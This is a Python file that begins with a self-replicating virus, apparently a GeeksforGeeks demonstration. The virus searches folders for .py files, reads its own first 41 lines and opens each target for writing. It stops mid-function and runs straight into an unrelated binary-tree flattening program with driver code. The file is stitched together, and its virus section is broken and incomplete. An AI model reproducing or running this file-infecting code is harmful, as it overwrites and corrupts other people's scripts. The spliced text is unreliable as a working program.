#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to flatten a given Binary
# Tree into linked list
class Node:
     
    def __init__(self):
         
        self.key = 0
        self.left = None
        self.right = None
 
# Utility that allocates a new Node
# with the given key
def newNode(key):
     
    node = Node()
    node.key = key
    node.left = node.right = None
    return (node)
 
# Function to convert binary tree into
# linked list by altering the right node
# and making left node point to None
def flatten(root):
 
    # Base condition- return if root is None
    # or if it is a leaf node
    if (root == None or root.left == None and
                        root.right == None):
        return
     
    # If root.left exists then we have
    # to make it root.right
    if (root.left != None):
 
        # Move left recursively
        flatten(root.left)
    
        # Store the node root.right
        tmpRight = root.right
        root.right = root.left
        root.left = None
 
        # Find the position to insert
        # the stored value  
        t = root.right
        while (t.right != None):
            t = t.right
 
        # Insert the stored value
        t.right = tmpRight
 
    # Now call the same function
    # for root.right
    flatten(root.right)
 
# To find the inorder traversal
def inorder(root):
 
    # Base condition
    if (root == None):
        return
     
    inorder(root.left)
    print(root.key, end = ' ')
    inorder(root.right)
 
# Driver Code
if __name__=='__main__':
     
    '''   1
        /   \
       2     5
      / \     \
     3   4     6 '''
    root = newNode(1)
    root.left = newNode(2)
    root.right = newNode(5)
    root.left.left = newNode(3)
    root.left.right = newNode(4)
    root.right.right = newNode(6)
 
    flatten(root)
 
    print("The Inorder traversal after "
          "flattening binary tree ",
          end = '')
    inorder(root)
 
# This code is contributed by pratham76
# Time Complexity: O(n) - traverse the whole tree
# Space Complexity: O(1) - No Extra Space is used
